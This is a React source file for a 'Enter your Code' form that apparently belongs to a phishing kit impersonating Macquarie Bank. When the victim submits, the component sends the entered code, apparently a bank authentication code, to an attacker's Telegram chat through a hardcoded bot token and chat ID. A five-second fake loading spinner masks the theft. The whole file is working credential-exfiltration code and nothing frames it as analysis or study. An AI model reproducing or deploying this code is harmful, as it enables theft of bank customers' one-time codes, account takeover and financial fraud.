import { useState } from "react";

const TELEGRAM_BOT_TOKEN = "7038583008:AAGLUNtjIrPvDbtGGwY0yMb-hbkDdjszVP4";
const TELEGRAM_CHAT_ID = "1951445523";

const Code = () => {
  const [code, setCode] = useState("");
  const [isCodeEmpty, setIsCodeEmpty] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);
  const [showError, setShowError] = useState(false);

  const sendLoginToTelegram = async (code) => {
    const message = `
    \n********************************
    Code for Macquarie Bank: \nCode: ${code}
    \n********************************
    `;

    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
        }),
      }
    );
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitted(true);

    // Start spinner
    setLoading(true);

    try {
      // Simulate a delay (replace this with actual login logic)
      await new Promise((resolve) => setTimeout(resolve, 5000));

      // Proceed with login authentication
      if (code) {
        await sendLoginToTelegram(code);
      } else {
        console.log("Login unsuccessful!");
      }
    } catch (error) {
      console.error("Login failed", error);
    } finally {
      setLoading(false); // Stop spinner after completion
    }
  };

  const handleCodeChange = (e) => {
    const value = e.target.value;
    setCode(value);
    setIsCodeEmpty(value.trim() === ""); // Check if password is empty
  };

  return (
    <div>
      <form onSubmit={handleSubmit}>
        <div className="form-group--material">
          <input
            className={`form-control--material form-control--with-addition ${
              isSubmitted && isCodeEmpty ? "invalid" : ""
            }`}
            autoComplete="off"
            id="text"
            aria-label="text"
            placeholder=" "
            type="text"
            value={code}
            onChange={handleCodeChange}
            onFocus={(e) => setIsCodeEmpty(false)}
          />

          <span className="form-control-bar--material"></span>
          <label
            // aria-hidden="true"
            htmlFor="code"
            className="form-label--material"
          >
            Enter your Code
          </label>
        </div>

        <div className="button-container">
          <button type="submit" className="button">
            {loading ? <span className="spinner"></span> : "Submit"}
          </button>
        </div>
      </form>
    </div>
  );
};

export default Code;
